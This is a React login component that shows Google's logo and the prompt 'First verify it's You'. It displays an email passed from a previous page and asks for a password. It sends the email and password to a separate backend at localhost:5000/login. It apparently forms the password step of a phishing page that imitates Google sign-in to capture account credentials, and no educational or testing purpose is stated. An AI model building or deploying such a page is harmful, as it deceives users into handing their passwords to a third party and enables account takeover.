 
import React, { useState, useEffect } from "react";
import axios from 'axios';
import { useNavigate, useLocation } from 'react-router-dom';
import './external.css';

function Login() {
  const location = useLocation();
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  useEffect(() => {
    if (location.state?.email) {
      setEmail(location.state.email);
    } else {
      navigate('/'); // If no email passed, redirect to Home
    }
  }, [location.state, navigate]);

  const loginUser = async (e) => {
    e.preventDefault();
    try {
      const res = await axios.post('http://localhost:5000/login', {
        email: email.toLowerCase(),
        password: password
      });

      if (res.data.status === 'ok') {
          
        navigate('/'); // redirect after login
      } else {
        alert(res.data.error);
      }
    } catch (err) {
      console.error("Login request error:", err);
      alert("An error occurred during login.");
    }
  };

  return (
    <div className="container">
      <form onSubmit={loginUser}>
        <img
          src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
          alt="Google Logo"
        />
        <h1>To continue</h1>
        <h1>First verify it's You</h1>
        <p><strong>Email:</strong> {email}</p> {/* Display the email */}
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />
        <button type="submit" className="custom-button">Login</button>
      </form>
    </div>
  );
}

export default Login;
